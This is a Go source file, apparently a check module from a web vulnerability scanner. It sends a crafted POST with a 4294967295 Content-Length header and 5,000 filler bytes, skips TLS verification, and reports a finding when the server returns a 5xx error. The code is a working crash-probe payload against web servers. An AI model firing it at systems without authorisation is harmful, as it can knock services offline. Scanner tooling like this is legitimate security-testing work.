package webserver

import (
	"bytes"
	"crypto/tls"
	"fmt"
	"net/http"
	"time"

	webscan "github.com/Method-Security/webscan/generated/go"
)

type BufferOverflowContentHeaderLibrary struct{}

func (BufferOverflowContentHeaderLib *BufferOverflowContentHeaderLibrary) ModuleRun(target string, config *webscan.WebServerTypeConfig) (*webscan.Attempt, []string) {
	// Initialize structs
	attempt := webscan.Attempt{Name: webscan.ModuleNameBufferOverflowContentHeader, Timestamp: time.Now()}
	errors := []string{}
	finding := false

	// Deploy payload
	payload := bytes.Repeat([]byte("A"), 5000)
	headers := map[string]string{
		"Host":           target,
		"Content-Length": "4294967295",
		"Connection":     "close",
	}
	payloadRequest := fmt.Sprintf("POST / HTTP/1.1\r\nHost: %s\r\n", headers["Host"])
	payloadRequest += fmt.Sprintf("Content-Length: %s\r\n", headers["Content-Length"])
	payloadRequest += fmt.Sprintf("Connection: %s\r\n\r\n", headers["Connection"])
	request := webscan.GeneralRequestInfo{
		Method:  webscan.HttpMethodPost,
		Url:     target,
		Headers: headers,
	}

	client := &http.Client{
		Timeout: time.Duration(config.Timeout) * time.Millisecond,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	resp, err := client.Post(target, "application/x-www-form-urlencoded", bytes.NewBuffer([]byte(payloadRequest+string(payload))))
	if err != nil {
		errors = append(errors, err.Error())
		GeneralAttemptInfo := webscan.GeneralAttemptInfo{Request: &request}
		attempt.AttemptInfo = webscan.NewAttemptInfoUnionFromGeneralAttempt(&GeneralAttemptInfo)
		return &attempt, errors
	}
	response := webscan.GeneralResponseInfo{
		StatusCode: resp.StatusCode,
	}
	err = resp.Body.Close()
	if err != nil {
		return &attempt, errors
	}

	// Marshal structs
	GeneralAttemptInfo := webscan.GeneralAttemptInfo{Request: &request, Response: &response}
	attempt.AttemptInfo = webscan.NewAttemptInfoUnionFromGeneralAttempt(&GeneralAttemptInfo)
	finding = BufferOverflowContentHeaderLib.AnalyzeResponse(webscan.NewResponseUnionFromGeneralResponse(&response))
	attempt.Finding = finding
	return &attempt, errors
}

func (BufferOverflowContentHeaderLib *BufferOverflowContentHeaderLibrary) AnalyzeResponse(response *webscan.ResponseUnion) bool {
	return response.GeneralResponse.StatusCode >= 500
}
